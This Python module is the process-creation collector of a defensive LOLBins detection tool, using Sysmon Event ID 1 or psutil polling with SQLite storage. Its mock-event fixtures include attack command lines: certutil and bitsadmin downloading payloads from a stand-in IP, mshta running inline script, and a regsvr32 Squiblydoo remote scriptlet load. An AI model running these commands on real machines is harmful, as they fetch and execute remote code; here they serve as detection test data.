"""Unified Windows Process Creation Collector for the LOLBins Detection System.

Orchestrates Sysmon Event ID 1 subscription with automatic fallback to psutil polling,
persists events to SQLite, and supports continuous execution with graceful shutdown.
"""

from collections.abc import Callable, Iterator
from datetime import datetime, timezone
import logging
from pathlib import Path

from collector.psutil_collector import PsutilCollector
from collector.sysmon_collector import SysmonCollector
from storage.database import DatabaseManager
from utils.models import ProcessEvent

logger = logging.getLogger("lolbins-detector.collector")


class ProcessCollector:
    """Robust Windows process creation collector.

    Prefers Sysmon Event ID 1 when available, seamlessly falling back to psutil
    polling if Sysmon is not installed or permission is restricted.
    """

    def __init__(
        self,
        mode: str = "auto",
        poll_interval: float = 1.0,
        ignore_images: list[str] | None = None,
        db_manager: DatabaseManager | None = None,
        db_path: str | Path | None = None,
    ) -> None:
        """Initialize the process collector.

        Args:
            mode: Collection mode ('auto', 'sysmon', 'psutil_polling', or 'mock').
                  'auto' automatically selects Sysmon if accessible, else falls back to psutil.
            poll_interval: Interval in seconds for polling or signal timeouts.
            ignore_images: List of executable image names to ignore.
            db_manager: Optional DatabaseManager instance to persist captured events to SQLite.
            db_path: Optional path to an SQLite database if db_manager is not supplied.
        """
        self.mode = mode.lower()
        self.poll_interval = poll_interval
        self.ignore_images: set[str] = {img.lower() for img in (ignore_images or [])}
        self._running = False

        # SQLite persistence integration
        if db_manager is not None:
            self.db_manager: DatabaseManager | None = db_manager
        elif db_path is not None:
            self.db_manager = DatabaseManager(db_path=db_path)
        else:
            self.db_manager = None

        # Child collector instances
        self._sysmon_collector: SysmonCollector | None = None
        self._psutil_collector: PsutilCollector | None = None

    def stop(self) -> None:
        """Gracefully stop the continuous collection loop."""
        logger.info("Stopping process collector...")
        self._running = False
        if self._sysmon_collector is not None:
            self._sysmon_collector.stop()
        if self._psutil_collector is not None:
            self._psutil_collector.stop()

    def stream_events(self) -> Iterator[ProcessEvent]:
        """Stream process creation events continuously until stopped.

        Yields:
            ProcessEvent instances as they occur.
        """
        self._running = True

        if self.mode == "mock":
            logger.info("Starting collector in mock simulation mode")
            for event in self._stream_mock_events():
                if not self._running:
                    break
                self._persist_event(event)
                yield event
            return

        if self.mode == "psutil_polling":
            logger.info("Collector explicitly set to psutil polling mode")
            yield from self._stream_with_psutil()
            return

        # 'auto' or 'sysmon' mode: attempt Sysmon first
        sysmon_available, reason = SysmonCollector.is_available()

        if sysmon_available:
            logger.info("Sysmon Event ID 1 detected: %s", reason)
            logger.info("Starting primary telemetry collection via Sysmon Event ID 1")
            try:
                self._sysmon_collector = SysmonCollector(
                    poll_interval=self.poll_interval,
                    ignore_images=self.ignore_images,
                )
                for event in self._sysmon_collector.stream_events():
                    if not self._running:
                        break
                    self._persist_event(event)
                    yield event
            except Exception as exc:
                logger.error("Sysmon collector failed during streaming: %s", exc)

            if not self._running:
                return

            logger.warning("Sysmon stream terminated unexpectedly; falling back to psutil polling.")
        else:
            if self.mode == "sysmon":
                logger.warning(
                    "Sysmon requested but unavailable (%s). Falling back to psutil polling.",
                    reason,
                )
            else:
                logger.info(
                    "Sysmon not available (%s). Defaulting to psutil polling.",
                    reason,
                )

        # Fallback to psutil polling
        yield from self._stream_with_psutil()

    def _stream_with_psutil(self) -> Iterator[ProcessEvent]:
        """Collect process events via psutil polling fallback."""
        logger.info("Starting process monitor using psutil polling")
        self._psutil_collector = PsutilCollector(
            poll_interval=self.poll_interval,
            ignore_images=self.ignore_images,
        )
        for event in self._psutil_collector.stream_events():
            if not self._running:
                break
            self._persist_event(event)
            yield event

    def run(self, on_event: Callable[[ProcessEvent], None] | None = None) -> None:
        """Run the collector continuously until stopped.

        Args:
            on_event: Optional callback invoked for each captured ProcessEvent.
        """
        logger.info("Running process collector service (Ctrl+C to stop)...")
        try:
            for event in self.stream_events():
                if on_event:
                    try:
                        on_event(event)
                    except Exception as exc:
                        logger.error("Error in on_event callback: %s", exc)
        except KeyboardInterrupt:
            logger.info("Collector interrupted by user.")
        finally:
            self.stop()

    def _persist_event(self, event: ProcessEvent) -> None:
        """Save captured process event to SQLite if database manager is configured."""
        if self.db_manager is not None:
            try:
                self.db_manager.insert_process_event(event)
            except Exception as exc:
                logger.error("Failed to persist event (PID %d) to SQLite: %s", event.pid, exc)

    def _stream_mock_events(self) -> Iterator[ProcessEvent]:
        """Yield synthetic Windows process creation events testing core LOLBin rules."""
        sample_events = [
            # 1. Benign background service
            ProcessEvent(
                pid=4120,
                ppid=1044,
                image=r"C:\Windows\System32\svchost.exe",
                command_line=r"C:\Windows\System32\svchost.exe -k netsvcs -p",
                user=r"NT AUTHORITY\SYSTEM",
                parent_image=r"C:\Windows\System32\services.exe",
                integrity_level="System",
                creation_time=datetime.now(timezone.utc).isoformat(),
            ),
            # 2. Rule 1 & Rule 2: Office application (winword.exe) spawning certutil with -urlcache and http://
            ProcessEvent(
                pid=6832,
                ppid=3912,
                image=r"C:\Windows\System32\certutil.exe",
                command_line=(
                    r"certutil.exe -urlcache -split -f "
                    r"http://198.51.100.42/payload.bin C:\ProgramData\update.bin"
                ),
                user=r"WORKSTATION\StandardUser",
                parent_image=r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE",
                integrity_level="Medium",
                creation_time=datetime.now(timezone.utc).isoformat(),
            ),
            # 3. Rule 3: Suspicious bitsadmin download transfer from external URL
            ProcessEvent(
                pid=7050,
                ppid=2210,
                image=r"C:\Windows\System32\bitsadmin.exe",
                command_line=(
                    r"bitsadmin.exe /transfer updateJob /download /priority high "
                    r"http://198.51.100.42/stage2.exe C:\ProgramData\stage2.exe"
                ),
                user=r"WORKSTATION\StandardUser",
                parent_image=r"C:\Windows\System32\cmd.exe",
                integrity_level="Medium",
                creation_time=datetime.now(timezone.utc).isoformat(),
            ),
            # 4. Rule 4: Mshta executing inline javascript
            ProcessEvent(
                pid=7100,
                ppid=7050,
                image=r"C:\Windows\System32\mshta.exe",
                command_line=r'mshta.exe javascript:a=new(ActiveXObject)("WScript.Shell");a.Run("calc.exe",0);close()',
                user=r"WORKSTATION\StandardUser",
                parent_image=r"C:\Windows\System32\cmd.exe",
                integrity_level="Medium",
                creation_time=datetime.now(timezone.utc).isoformat(),
            ),
            # 5. Rule 5: Regsvr32 Squiblydoo proxy execution loading remote scriptlet via scrobj.dll
            ProcessEvent(
                pid=8104,
                ppid=6120,
                image=r"C:\Windows\System32\regsvr32.exe",
                command_line=r"regsvr32.exe /s /n /u /i:http://198.51.100.42/backdoor.sct scrobj.dll",
                user=r"WORKSTATION\AdminUser",
                parent_image=r"C:\Windows\explorer.exe",
                integrity_level="High",
                creation_time=datetime.now(timezone.utc).isoformat(),
            ),
        ]

        for event in sample_events:
            if not self._running:
                break
            if event.image_name not in self.ignore_images:
                yield event
        self._running = False
